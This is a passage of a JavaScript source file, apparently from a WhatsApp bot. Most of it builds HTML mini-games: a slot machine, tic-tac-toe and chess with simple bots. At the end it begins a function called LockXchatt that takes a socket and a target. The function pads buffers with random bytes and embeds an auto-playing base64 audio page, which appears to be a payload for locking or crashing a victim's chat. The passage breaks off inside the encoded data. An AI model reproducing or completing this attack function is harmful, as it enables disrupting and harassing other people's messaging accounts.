function symbol(col,row,index,x,y,w,h,curve){var value=reels[col].strip[mod(index,reels[col].strip.length)],won=winCells.some(function(v){return v[0]===col&&v[1]===row}),pulse=won?1+.09*Math.sin(performance.now()/85):1;if(won){var glow=ctx.createRadialGradient(x+w/2,y+h/2,2,x+w/2,y+h/2,w*.72);glow.addColorStop(0,'rgba(255,247,159,.92)');glow.addColorStop(.48,'rgba(119,205,94,.62)');glow.addColorStop(1,'rgba(44,126,75,0)');ctx.fillStyle=glow;ctx.fillRect(x,y,w,h)}ctx.save();ctx.translate(x+w/2,y+h/2);ctx.scale(pulse,curve*pulse);ctx.textAlign='center';ctx.textBaseline='middle';ctx.shadowColor=won?'#d9ff75':'rgba(18,55,38,.28)';ctx.shadowBlur=won?16:3;if(value===4){ctx.font='900 '+Math.floor(h*.72)+'px Impact,Arial Black';ctx.lineWidth=4;ctx.strokeStyle='#790914';ctx.strokeText('7',0,2);ctx.fillStyle='#f31c2b';ctx.fillText('7',0,2)}else if(value===5){ctx.font='900 '+Math.floor(h*.29)+'px Arial Black';ctx.fillStyle='#861019';ctx.beginPath();ctx.ellipse(0,0,w*.38,h*.25,0,0,Math.PI*2);ctx.fill();ctx.fillStyle='#fff0b4';ctx.fillText('BAR',0,1)}else{ctx.font=Math.floor(h*.56)+'px Apple Color Emoji,Segoe UI Emoji,sans-serif';ctx.fillText(labels[value],0,1)}ctx.restore()}
function draw(){if(!W||!H)return;ctx.clearRect(0,0,W,H);var rw=W/5,rh=H/3;for(var c=0;c<5;c++){var x=c*rw,reel=reels[c],base=Math.floor(reel.pos),frac=reel.pos-base;var bg=ctx.createLinearGradient(x,0,x+rw,0);bg.addColorStop(0,'#8f6a39');bg.addColorStop(.16,'#fff8d8');bg.addColorStop(.5,'#fffdf0');bg.addColorStop(.84,'#f0dfad');bg.addColorStop(1,'#79552c');ctx.fillStyle=bg;ctx.fillRect(x,0,rw,H);ctx.save();ctx.beginPath();ctx.rect(x,0,rw,H);ctx.clip();ctx.filter=reel.speed>5?'blur(1.3px)':'none';for(var k=-1;k<5;k++){var y=(k-frac)*rh,row=k;var center=(y+rh/2)/H,curve=.78+.22*Math.cos((center-.5)*Math.PI);symbol(c,row,base+k,x,y,rw,rh,curve);ctx.strokeStyle='rgba(92,57,20,.25)';ctx.beginPath();ctx.moveTo(x,y+rh);ctx.lineTo(x+rw,y+rh);ctx.stroke()}ctx.restore();ctx.filter='none';if(c){ctx.fillStyle='#573512';ctx.fillRect(x-1,0,2,H)}}var shade=ctx.createLinearGradient(0,0,0,H);shade.addColorStop(0,'rgba(23,7,2,.72)');shade.addColorStop(.13,'rgba(0,0,0,0)');shade.addColorStop(.48,'rgba(255,255,255,0)');shade.addColorStop(.86,'rgba(0,0,0,0)');shade.addColorStop(1,'rgba(20,5,1,.78)');ctx.fillStyle=shade;ctx.fillRect(0,0,W,H);ctx.strokeStyle='rgba(20,61,43,.45)';ctx.strokeRect(.5,.5,W-1,H-1);drawSparks()}
function drawSparks(){var now=performance.now();for(var i=0;i<sparks.length;i++){var s=sparks[i],t=(now-s.born)/1000;if(t<0)continue;var a=Math.max(0,1-t/1.25);if(!a)continue;ctx.save();ctx.globalAlpha=a;ctx.translate(s.x+s.vx*t,s.y+s.vy*t+85*t*t);ctx.rotate(t*s.spin);ctx.fillStyle=s.color;ctx.shadowColor=s.color;ctx.shadowBlur=5;ctx.fillRect(-s.size/2,-s.size/2,s.size,s.size*1.8);ctx.restore()}}
function celebrate(now){draw();if(now<winUntil)requestAnimationFrame(celebrate);else{sparks=[];MCH.classList.remove('winner');draw()}}
function startWin(){var colors=['#e7d277','#9ce277','#4ebc78','#fff4b0'];sparks=[];for(var i=0;i<34;i++)sparks.push({x:W*(.1+Math.random()*.8),y:H*(.28+Math.random()*.44),vx:(Math.random()-.5)*70,vy:-45-Math.random()*75,born:performance.now()+Math.random()*180,size:2+Math.random()*3,spin:(Math.random()-.5)*12,color:colors[i%colors.length]});winUntil=performance.now()+1450;MCH.classList.add('winner');requestAnimationFrame(celebrate)}
function frame(now){if(!busy)return;var dt=Math.min((now-last)/1000,.035);last=now;var stopped=0;for(var c=0;c<5;c++){var r=reels[c],elapsed=now-startTime;if(elapsed<180){r.speed=23*(elapsed/180);r.pos+=r.speed*dt}else if(elapsed<r.stop){r.speed=23;r.pos+=r.speed*dt}else{if(r.decelStart===null){r.decelStart=now;r.from=r.pos;r.target=Math.ceil(r.pos)+7}var p=Math.min(1,(now-r.decelStart)/720),ease=1-Math.pow(1-p,4);r.pos=r.from+(r.target-r.from)*ease;r.speed=(r.target-r.from)*4*Math.pow(1-p,3)/.72;if(p>=1){r.pos=r.target;r.speed=0;r.stopped=true}}if(r.stopped)stopped++}draw();if(stopped===5){busy=false;setTimeout(evaluate,150)}else requestAnimationFrame(frame)}
function boardValue(col,row){var r=reels[col];return r.strip[mod(Math.round(r.pos)+row,r.strip.length)]}
function evaluate(){LV.classList.remove('pull');var patterns=[[0,0,0,0,0],[1,1,1,1,1],[2,2,2,2,2],[0,1,2,1,0],[2,1,0,1,2]],total=0,wins=[];patterns.forEach(function(p,pi){var a=boardValue(0,p[0]),count=1;for(var x=1;x<5&&boardValue(x,p[x])===a;x++)count++;if(count>=3){total+=Math.floor(bet*pays[a]*(count===3?1:count===4?2:5));wins.push({p:p,n:count,line:pi})}});if(total){credits+=total;best=Math.max(best,total);wins.forEach(function(w){for(var x=0;x<w.n;x++)winCells.push([x,w.p[x]]);if(w.line<3)PL[w.line].classList.add('on')});MSG.textContent=total>=bet*20?'JACKPOT +'+total:'WIN +'+total;startWin()}else MSG.textContent='YOU LOOSER';SP.disabled=false;BT.disabled=false;ui();draw();if(credits<10)setTimeout(gameover,800);else if(bet>credits){bet=10;ui()}}
function spin(){if(busy||credits<bet)return;busy=true;clearWins();credits-=bet;ui();SP.disabled=true;BT.disabled=true;MSG.textContent='GOOD LUCK';LV.classList.add('pull');startTime=performance.now();last=startTime;for(var c=0;c<5;c++){reels[c].speed=0;reels[c].stop=1050+c*220;reels[c].stopped=false;reels[c].decelStart=null}requestAnimationFrame(frame)}
function gameover(){FB.textContent=best;OV.className='over'}
BT.onclick=function(){if(busy)return;bet=bet===10?20:bet===20?50:10;if(bet>credits)bet=10;ui()};SP.onclick=spin;LV.onclick=spin;document.getElementById('restart').onclick=function(){credits=500;bet=10;best=0;busy=false;OV.className='over off';MSG.textContent='SPIN TO PLAY';SP.disabled=false;BT.disabled=false;clearWins();ui();draw()};addEventListener('resize',resize);ui();resize();
})();
</script>
</body></html>`;
}

// ================================================================
// ================ FUNGSI GENERATE HTML XO =======================
// ================ TARUH DI ATAS SWITCH CASE =====================
// ================================================================

function generateXOHTML() {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>🎮 XO</title>
<style>
*{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none;box-sizing:border-box}
body{margin:0;background:transparent;font-family:Arial,sans-serif;color:#e8edf0;touch-action:manipulation}
.wrap{width:100%;max-width:620px;margin:auto;padding:16px}
.card{background:rgba(29,40,47,.97);border:1px solid rgba(255,255,255,.13);border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.35)}
.head{padding:17px 20px;border-bottom:1px solid rgba(255,255,255,.1);display:flex;justify-content:space-between;align-items:center;gap:12px}
.brand{font-size:10px;letter-spacing:1.5px;color:rgba(255,255,255,.42)}
.title{font-size:21px;font-weight:bold;color:#fff}
.stats{display:flex;gap:15px;text-align:right}
.value{font:700 18px monospace;color:#fff}
.label{font-size:8px;color:rgba(255,255,255,.38);letter-spacing:1px}
.main{padding:16px}
.board{position:relative;background:rgba(4,9,12,.35);border:1px solid rgba(255,255,255,.09);border-radius:12px;overflow:hidden}
.controls{display:flex;gap:8px;margin-top:10px;justify-content:center}
.button{min-height:45px;border:1px solid rgba(255,255,255,.15);border-radius:9px;color:#fff;font-weight:bold;font-size:12px;background:rgba(255,255,255,.07);padding:0 16px;cursor:pointer}
.button:active{transform:scale(.95)}
.primary{background:linear-gradient(135deg,rgba(124,84,227,.75),rgba(58,125,191,.7));border-color:rgba(158,133,255,.65)}
.status{text-align:center;font:10px monospace;color:rgba(255,255,255,.45);margin-top:10px;min-height:12px}
.overlay{position:absolute;inset:0;background:rgba(8,14,18,.82);display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;z-index:5;border-radius:12px}
.overlay.hidden{display:none}
.overlay-title{font-size:25px;font-weight:bold;letter-spacing:1px}
.overlay-sub{font-size:11px;color:rgba(255,255,255,.52);margin-top:8px}
.modes{display:flex;gap:7px;margin-bottom:10px}
.modes .button{flex:1}
.active{background:#00a884;color:#071713;border-color:#00c69b}
.xo-grid{display:grid;grid-template-columns:repeat(3,1fr);background:#10191e}
.cell{aspect-ratio:1;border:0;background:transparent;color:#edf2f4;font:bold 52px Arial;border-right:1px solid #34434b;border-bottom:1px solid #34434b;cursor:pointer}
.cell:active{transform:scale(.95)}
.cell:nth-child(3n){border-right:0}
.cell:nth-last-child(-n+3){border-bottom:0}
.cell.o{color:#00c99a}
.cell.win{background:rgba(0,168,132,.18)}
</style>
</head>
<body>
<div class="wrap">
<div class="card">
<div class="head">
<div>
<div class="brand">🎮 ARCADE</div>
<div class="title">TIC TAC TOE</div>
</div>
<div class="stats">
<div><div class="label">X</div><div class="value" id="sx">0</div></div>
<div><div class="label">DRAW</div><div class="value" id="sd">0</div></div>
<div><div class="label">O</div><div class="value" id="so">0</div></div>
</div>
</div>
<div class="main">
<div class="modes">
<button class="button active" id="ai">🤖 VS BOT</button>
<button class="button" id="pvp">👥 2 PLAYER</button>
</div>
<div class="board">
<div class="xo-grid" id="grid"></div>
<div class="overlay hidden" id="overlay">
<div class="overlay-title" id="result">🏆 WINNER</div>
<div class="overlay-sub">Tap NEW ROUND to continue</div>
</div>
</div>
<div class="controls">
<button class="button primary" id="reset">🔄 NEW ROUND</button>
</div>
<div class="status" id="status">Your turn • Play as X</div>
</div>
</div>
</div>
<script>
const grid=document.getElementById('grid');
const statusEl=document.getElementById('status');
const overlay=document.getElementById('overlay');
const resultEl=document.getElementById('result');
let board=Array(9).fill('');
let turn='X';
let mode='ai';
let over=false;
let scores={X:0,O:0,D:0};
const wins=[[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];

function winner(b){
    for(const line of wins){
        if(b[line[0]]&&b[line[0]]===b[line[1]]&&b[line[0]]===b[line[2]]){
            return {who:b[line[0]],line};
        }
    }
    return b.every(Boolean)?{who:'D',line:[]}:null;
}

function render(win=[]){
    grid.innerHTML='';
    board.forEach((v,i)=>{
        const b=document.createElement('button');
        b.className='cell'+(v==='O'?' o':'')+(win.includes(i)?' win':'');
        b.textContent=v;
        b.disabled=!!v||over;
        b.addEventListener('pointerdown',e=>{
            e.preventDefault();
            play(i);
        });
        grid.appendChild(b);
    });
    document.getElementById('sx').textContent=scores.X;
    document.getElementById('so').textContent=scores.O;
    document.getElementById('sd').textContent=scores.D;
}

function finish(r){
    over=true;
    scores[r.who]++;
    render(r.line);
    resultEl.textContent=r.who==='D'?'🤝 DRAW':r.who+' WINS! 🎉';
    overlay.classList.remove('hidden');
    statusEl.textContent=resultEl.textContent;
}

function play(i){
    if(over||board[i])return;
    board[i]=turn;
    let r=winner(board);
    if(r)return finish(r);
    turn=turn==='X'?'O':'X';
    render();
    statusEl.textContent='Turn: '+turn;
    if(mode==='ai'&&turn==='O')setTimeout(aiMove,280);
}

function aiMove(){
    if(over)return;
    let pick=null;
    for(const who of ['O','X']){
        for(const line of wins){
            const vals=line.map(i=>board[i]);
            if(vals.filter(v=>v===who).length===2&&vals.includes('')){
                pick=line[vals.indexOf('')];
                break;
            }
            if(pick!==null)break;
        }
        if(pick!==null)break;
    }
    if(pick===null&&board[4]==='')pick=4;
    if(pick===null){
        const empty=board.map((v,i)=>v===''?i:-1).filter(i=>i>=0);
        pick=empty[Math.floor(Math.random()*empty.length)];
    }
    play(pick);
}

function reset(){
    board=Array(9).fill('');
    turn='X';
    over=false;
    overlay.classList.add('hidden');
    statusEl.textContent=mode==='ai'?'Your turn • Play as X':'Player X turn';
    render();
}

function setMode(next){
    mode=next;
    document.getElementById('ai').classList.toggle('active',mode==='ai');
    document.getElementById('pvp').classList.toggle('active',mode==='pvp');
    reset();
}

document.getElementById('ai').addEventListener('pointerdown',()=>setMode('ai'));
document.getElementById('pvp').addEventListener('pointerdown',()=>setMode('pvp'));
document.getElementById('reset').addEventListener('pointerdown',reset);
reset();
</script>
</body></html>`;
}

function generateChessHTML() {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>♟️ Chess</title>
<style>
*{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none;box-sizing:border-box}
body{margin:0;background:transparent;font-family:Arial,sans-serif;color:#eee;touch-action:manipulation;cursor:pointer}
.wrap{width:100%;max-width:620px;margin:auto;padding:16px}
.card{background:rgba(255,255,255,.06);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,255,255,.15);border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.35)}
.head{padding:18px 20px;border-bottom:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
.brand{font-size:11px;letter-spacing:1.5px;color:rgba(255,255,255,.45)}
.title{font-size:21px;font-weight:bold;color:#fff}
.status{font-size:14px;font-weight:bold;color:#fff;text-shadow:0 0 10px rgba(108,92,231,.85)}
.modes{display:flex;gap:8px;margin-top:8px}
.modes button{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);border-radius:8px;color:#fff;padding:8px 16px;font-size:12px;cursor:pointer;font-weight:bold}
.modes button.active{background:rgba(108,92,231,.4);border-color:#6c5ce7;box-shadow:0 0 20px rgba(108,92,231,.2)}
.modes button:active{transform:scale(.95)}
.main{padding:18px}
canvas{width:100%;height:auto;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.12);border-radius:12px;display:block;aspect-ratio:1/1;touch-action:none}
</style>
</head>
<body>
<div class="wrap">
<div class="card">
<div class="head">
<div>
<div class="brand">♟️ CHESS</div>
<div class="title">CATUR</div>
</div>
<div style="text-align:right">
<div class="status" id="status">♟️ Giliran Putih</div>
<div class="modes">
<button id="mode1p" class="active">🤖 VS BOT</button>
<button id="mode2p">👥 2 PLAYER</button>
</div>
</div>
</div>
<div class="main">
<canvas id="game" width="400" height="400"></canvas>
</div>
</div>
</div>
<script>
const c=document.getElementById('game');
const x=c.getContext('2d');
const st=document.getElementById('status');

// ===== PIECES =====
const P={'r':'♜','n':'♞','b':'♝','q':'♛','k':'♚','p':'♟','R':'♜','N':'♞','B':'♝','Q':'♛','K':'♚','P':'♟'};

let bd, trn, sel, mvs=[], go, msg, mode='1p';

const isW=p=>p>='A'&&p<='Z';
const isB=p=>p>='a'&&p<='z';
const isE=p=>p==='';

const drs={
    'R':[[-1,0],[1,0],[0,-1],[0,1]],
    'B':[[-1,-1],[-1,1],[1,-1],[1,1]],
    'Q':[[-1,0],[1,0],[0,-1],[0,1],[-1,-1],[-1,1],[1,-1],[1,1]],
    'N':[[-2,-1],[-2,1],[-1,-2],[-1,2],[1,-2],[1,2],[2,-1],[2,1]],
    'K':[[-1,0],[1,0],[0,-1],[0,1],[-1,-1],[-1,1],[1,-1],[1,1]]
};

const isO=(w,p)=>p!==''&&(w?isB(p):isW(p));

function getP(r,c,b){
    let p=b[r][c];
    if(!p)return [];
    let w=isW(p), m=[], t=p.toUpperCase();
    if(t==='P'){
        let d=w?-1:1;
        if(r+d>=0&&r+d<8&&isE(b[r+d][c]))m.push({r:r+d,c});
        if(r===(w?6:1)&&r+d*2>=0&&r+d*2<8&&isE(b[r+d*2][c]))m.push({r:r+d*2,c});
        if(c>0&&r+d>=0&&r+d<8&&isO(w,b[r+d][c-1]))m.push({r:r+d,c:c-1});
        if(c<7&&r+d>=0&&r+d<8&&isO(w,b[r+d][c+1]))m.push({r:r+d,c:c+1});
    }else if(t==='N'||t==='K'){
        for(let d of drs[t]){
            let nr=r+d[0], nc=c+d[1];
            if(nr>=0&&nr<8&&nc>=0&&nc<8&&(!b[nr][nc]||isO(w,b[nr][nc])))m.push({r:nr,c:nc});
        }
    }else{
        for(let d of drs[t]){
            let nr=r+d[0], nc=c+d[1];
            while(nr>=0&&nr<8&&nc>=0&&nc<8){
                if(isE(b[nr][nc]))m.push({r:nr,c:nc});
                else{if(isO(w,b[nr][nc]))m.push({r:nr,c:nc});break;}
                nr+=d[0];nc+=d[1];
            }
        }
    }
    return m;
}

function isAtt(r,c,bw,b){
    for(let i=0;i<8;i++)for(let j=0;j<8;j++){
        if(b[i][j]&&(bw?isW(b[i][j]):isB(b[i][j]))){
            let m=getP(i,j,b);
            if(m.some(x=>x.r===r&&x.c===c))return true;
        }
    }
    return false;
}

function getL(r,c,b){
    let p=b[r][c], w=isW(p), pm=getP(r,c,b), lm=[];
    for(let m of pm){
        let nb=b.map(x=>[...x]);
        nb[m.r][m.c]=p;
        nb[r][c]='';
        let kr=-1,kc=-1;
        for(let i=0;i<8;i++)for(let j=0;j<8;j++)if(nb[i][j]===(w?'K':'k')){kr=i;kc=j;break;}
        if(kr===-1)continue;
        if(!isAtt(kr,kc,!w,nb))lm.push(m);
    }
    return lm;
}

function ini(){
    bd=[
        ['r','n','b','q','k','b','n','r'],
        ['p','p','p','p','p','p','p','p'],
        ['','','','','','','',''],
        ['','','','','','','',''],
        ['','','','','','','',''],
        ['','','','','','','',''],
        ['P','P','P','P','P','P','P','P'],
        ['R','N','B','Q','K','B','N','R']
    ];
    trn='w';
    sel=null;
    mvs=[];
    go=false;
    msg='';
    st.textContent='♟️ Giliran Putih';
    draw();
}

function draw(){
    let w=c.width/8;
    x.clearRect(0,0,c.width,c.height);
    
    // Board
    for(let i=0;i<8;i++)for(let j=0;j<8;j++){
        x.fillStyle=(i+j)%2===0?'#ebecd0':'#739552';
        x.fillRect(j*w,i*w,w,w);
    }
    
    // Selected
    if(sel){
        x.fillStyle='rgba(108,92,231,.6)';
        x.fillRect(sel.c*w,sel.r*w,w,w);
    }
    
    // Moves
    for(let m of mvs){
        let target=bd[m.r][m.c];
        if(target){
            x.strokeStyle='rgba(231,76,60,.7)';
            x.lineWidth=3;
            x.beginPath();
            x.arc(m.c*w+w/2,m.r*w+w/2,w*.4,0,7);
            x.stroke();
        }else{
            x.beginPath();
            x.arc(m.c*w+w/2,m.r*w+w/2,w*.18,0,7);
            x.fillStyle='rgba(108,92,231,.7)';
            x.fill();
        }
    }
    
    // Pieces
    x.textAlign='center';
    x.textBaseline='middle';
    x.font=w*.7+'px Arial';
    for(let i=0;i<8;i++)for(let j=0;j<8;j++){
        let p=bd[i][j];
        if(p){
            x.shadowColor='rgba(0,0,0,0.5)';
            x.shadowBlur=3;
            x.fillStyle=isW(p)?'#fff':'#222';
            x.fillText(P[p],j*w+w/2,i*w+w/2+3);
            x.shadowBlur=0;
        }
    }
    
    // Game Over
    if(go){
        x.fillStyle='rgba(15,15,25,.85)';
        x.fillRect(0,0,c.width,c.height);
        x.fillStyle='#fff';
        x.font='bold 32px Arial';
        x.fillText('♟️ GAME OVER',c.width/2,c.height/2-30);
        x.font='24px Arial';
        x.fillStyle=msg.includes('PUTIH')?'#4cd137':msg.includes('HITAM')?'#e84118':'#f1c40f';
        x.fillText(msg,c.width/2,c.height/2+25);
        x.fillStyle='#aaa';
        x.font='14px Arial';
        x.fillText('Tap layar untuk main lagi',c.width/2,c.height/2+75);
    }
}

// ===== CLICK HANDLER =====
c.addEventListener('pointerdown',e=>{
    if(go){ini();return;}
    
    const r=c.getBoundingClientRect();
    let cx=(e.clientX-r.left)*(c.width/r.width);
    let cy=(e.clientY-r.top)*(c.height/r.height);
    let col=Math.floor(cx/(c.width/8));
    let row=Math.floor(cy/(c.height/8));
    let p=bd[row][col];
    let mv=mvs.find(m=>m.r===row&&m.c===col);
    
    // ===== MODE 2 PLAYER =====
    if(mode==='2p'){
        if(mv){
            // Execute move
            bd[row][col]=bd[sel.r][sel.c];
            bd[sel.r][sel.c]='';
            // Promosi
            if(row===0&&bd[row][col]==='P')bd[row][col]='Q';
            if(row===7&&bd[row][col]==='p')bd[row][col]='q';
            // Ganti giliran
            trn=trn==='w'?'b':'w';
            sel=null;
            mvs=[];
            st.textContent=trn==='w'?'♟️ Giliran Putih':'♟️ Giliran Hitam';
            draw();
            // Cek game over
            checkGameOver();
            return;
        }else if(p&&((trn==='w'&&isW(p))||(trn==='b'&&isB(p)))){
            sel={r:row,c:col};
            mvs=getL(row,col,bd);
            draw();
            return;
        }else{
            sel=null;
            mvs=[];
            draw();
            return;
        }
    }
    
    // ===== MODE 1 PLAYER (VS BOT) =====
    if(trn!=='w')return;
    
    if(mv){
        bd[row][col]=bd[sel.r][sel.c];
        bd[sel.r][sel.c]='';
        if(row===0&&bd[row][col]==='P')bd[row][col]='Q';
        trn='b';
        sel=null;
        mvs=[];
        st.textContent='🤖 Bot berjalan...';
        draw();
        // Cek game over setelah move player
        if(!checkGameOver()){
            setTimeout(bot,500);
        }
    }else if(p&&isW(p)){
        sel={r:row,c:col};
        mvs=getL(row,col,bd);
        draw();
    }else{
        sel=null;
        mvs=[];
        draw();
    }
});

// ===== CHECK GAME OVER =====
function checkGameOver(){
    let allMoves=[];
    for(let i=0;i<8;i++)for(let j=0;j<8;j++){
        let p=bd[i][j];
        if(p&&((trn==='w'&&isW(p))||(trn==='b'&&isB(p)))){
            allMoves.push(...getL(i,j,bd));
        }
    }
    if(allMoves.length===0){
        go=true;
        let inCheck=false;
        for(let i=0;i<8;i++)for(let j=0;j<8;j++){
            if(bd[i][j]&&((trn==='w'&&bd[i][j]==='K')||(trn==='b'&&bd[i][j]==='k'))){
                if(isAtt(i,j,trn==='w'?false:true,bd))inCheck=true;
            }
        }
        if(inCheck){
            msg=trn==='w'?'🎉 HITAM MENANG!':'🎉 PUTIH MENANG!';
        }else{
            msg='🤝 STALEMATE!';
        }
        st.textContent='🏁 '+msg;
        draw();
        return true;
    }
    return false;
}

// ===== BOT AI =====
function bot(){
    let a=[];
    for(let i=0;i<8;i++)for(let j=0;j<8;j++){
        if(isB(bd[i][j])){
            let ms=getL(i,j,bd);
            ms.forEach(m=>a.push({f:{r:i,c:j},t:m}));
        }
    }
    if(a.length===0){
        if(!checkGameOver()){
            go=true;
            msg='🎉 ANDA MENANG!';
            st.textContent='🏆 MENANG';
            draw();
        }
        return;
    }
    
    // Prioritaskan capture
    let caps=a.filter(m=>bd[m.t.r][m.t.c]!=='');
    let p=caps.length?caps[Math.floor(Math.random()*caps.length)]:a[Math.floor(Math.random()*a.length)];
    
    bd[p.t.r][p.t.c]=bd[p.f.r][p.f.c];
    bd[p.f.r][p.f.c]='';
    if(p.t.r===7&&bd[p.t.r][p.t.c]==='p')bd[p.t.r][p.t.c]='q';
    trn='w';
    st.textContent='♟️ Giliran Anda';
    
    if(!checkGameOver()){
        draw();
    }
}

// ===== MODE SWITCH =====
function setMode(m){
    mode=m;
    document.getElementById('mode1p').classList.toggle('active',m==='1p');
    document.getElementById('mode2p').classList.toggle('active',m==='2p');
    ini();
}

document.getElementById('mode1p').addEventListener('click',()=>setMode('1p'));
document.getElementById('mode2p').addEventListener('click',()=>setMode('2p'));

ini();
</script>
</body>
</html>`;
}

async function LockXchatt(WaSocket, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
    const base64Data = "SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU5LjI3LjEwMAAAAAAAAAAAAAAA//uQZAAE8AAAaQAAAAgAAA0gAAABDO1aysSkacAAADSAAAAEIAV2ggAdEgQR3J3PVHN0msfFBd8ICMVAwJBWMGSdZhfUeqOR1dMJEvxXesTpYQRXsEPCTrghDnSfQn8kpkaAzEE8EOZP/9OfXTfQGOBwumhUn/ppwQHYnZP//RQAOaE+HMDM5qJhE0pYQHkOMTOM0hgd20h3aU3khfQzCabLVBjMIh4gCATXENQcTmImFw4ySFWp1EDQDEJgUtCC8kTnFQIKNwLHQCLMiFCwhMy2BDxrDxnQ61m0aw/EsoQuDQjm6BHglBiwO+2NVYOASrIv49gZhwtoSNyo/bCwE7LnSEbI1FuEBIChOOQbiUkmHwWZvLD09EpTS4Rhvnng5Nen+05F/y8fwB8DgipM9jLR6kRhMy9uThgb6Xx8Z0h9i6HgvnnRfTdf/T/+GPsG4SSmW4NQ4izgS67Nx1r/GvhdsyIEwiiPMggPwABBp5rVZ25zcVrM3Qod9nCs7LkupMpBKMOeiik3aiYWcxgBNBSkFC65aFZ7tjx2qttSPShe//uSZIqG9tVdM4Mae3AAAA0gAAABGel04Mzh68gAADSAAAAEkYSAaZPIEFCTQAaLDl3LLOStXrvxIx3lPCD8JgeMZFjtci6FGuTij4pQfcAmb/DaN8yIJjj3kYxhx4bcJikyXNBdC7qt/AHO9LNnUxDYlPPrYbCov8lQ5PDeDgcWAk/E7G+9KNRha1HIMsx8ZxK+IfZJKscklbGLEv/n/5kM0Vgacb0PKDkO1rGhAr/7+6kB+Hoasy0B18oB1VcChmSiaIK2GmoS2BGaycK6VzDS26/woIZBgYgl4mWZ4m9JlKBlp3J0phoOPC9TcTOcyhVuAAEzFhB0ptebTjoAdgEpC4jUJPMGONwGWOIvNj6JjqMrgdpEAsvXO0NckIlc8uyCaPcQa45Dj0FmNyizMSyowNCWtfC3GL1d/34xlbhtPlGNfvcN63/9zsbypOa5+rkYpIxObvxCKS+5zcrt7zzvU+WHP3b3Yzyr2929VO0lipSc1KLErp8868Ny+V287mGsKTGn7nrevw3T09jdPb1////+sPqUljBEFQCVBABQBv/7kmR0gAcIaEI1ZwAAAAANIKAAARwdmTX5nAAAAAA0gwAAACCEVi05qwSufaghIGDguOFZkUnFRwVGegweQHjAoZ/FUmTBUhzpev+GwNhZDuLnaFD5dNtzIgAQGluOzpYZkK93lpWbIiAwgKQqqze/fr+nJS37cYL/oTVLn+oYTNSz+U9EsSP2r0bdmjmXXyfjCkje+yqzE3Zf6HJfdqyq/GocsXc8887tJuzPXcN4TFjlXLOpS48tVpZTVaTWNNvLlv/ykGOq9JjYr272rFPhXzxz/us+f/ccsu/jrWH/lXpqSn3fvY7l8vzszeccoYfn8Kl61Tc+mq2f/9DNpNFUhIsGN63W63W/Uy4zAt1Ix0GmkCkOoVOYEMAJTDAowwiBzeDhgIOxkEEqIwEMOMcfZS+MvnQOiDQazmbqotPjSMjE2xqtWATompPE7z97nbbWG6SqlYZD8fgGijbTrDPpfGHsT7uPfNOnXjEYk+49BcZeJ+KOGWzOq6zmw72vI7ViT44YVLshsU1XKXS2pTz0Ufemle7tDT4VOWa1Wjrz1ir/+5JkUoAHG2JZ7m9ABAAADSDAAAAVwTVJnc0ACAAANIOAAARcxmpTbi0Sg2gwzzlOtX5dV5Xv16+GMvopPN0Pbu8q9NLHGjsERqXyGBe/vn5fD9HUqYU9y93////fZ7Lt+/2AAAAAAAZQxdTcm3XkYBBxEYGHF+2FiwPMVVodJwNAkrLwA0KGByGYYsMBlvTTtmJEGIEq4YOXaEAwpTpaGTADgcLAB0SCAxQGaCqqAg4yIYNEos2rXFV1tNYlbrSx91w2p7Kkp+RTfKePf+p38cOZWPv1P/9/hrPX/vP+f3L98z5/f/v563U/9YY9/mGGeH/3Xe/nft2u6ud1nl/573h+tZYbrxqGjh35Htq+01XQAAAAAAAz+zEeXJWFRYBRjBREFAUGJA8zvcMEmxYqMREjOGTJhjPLDovwuILsTi1AdEHCpbQxgUZBKRAk8XGmNJiMGCgqdKRoYPAABGhSpgyYyv0pZbJoBUCVhljvSV+X/z/U/Ox2OYR23NZXusPNDbTQcLMx1pit2m5mS/u873Zldmn9hHyv1tGRnNpZBeRb//uSZEiG9ThPUeN6M3AAAA0gAAABFU09RI5pLYAAADSAAAAE338Jru3Zs7vqaCELhRUHXMTkxYRvlqyEMZq8wZlamwkfAwQposXCwLMYAI82ITHINMLAciLlmzKqD0HgctM4FWEEIQwjoIOgggBhpjBaUAATHDJGFMChdVaRR5LoWIMPuvwiimg1NX7cHicsts90ro32hd6KPMQmiSbUcD5+mZEP2EmFZzefMWicsoraTHYZje4/yQGWF8zYJI91ebyNE3IsSKj9KcVipsoyuIkkZ8UTgzNiEInHSUvahtJiB+u1CtiCAAAAAAANVjTooms1XoojAT+OYk8DVxiOQYsXk04AAUpyWYagcmIPB2Wl2DMgIYWao5MI/lyy9iJjdYDcdvE0EMIEbWKxx/nufmGVD3xnZZL4Dxs6zlW0+5qt/Iq9unGcxfObjZO1gAhqnMy2sXEsttq96l+wwYvwOAYiOOh9KqQ+k99WNkSHK+cMsagM8vxOFl50POcdghipW1OunuZHWk+z6tPj+BE14Oy2Coj+Nu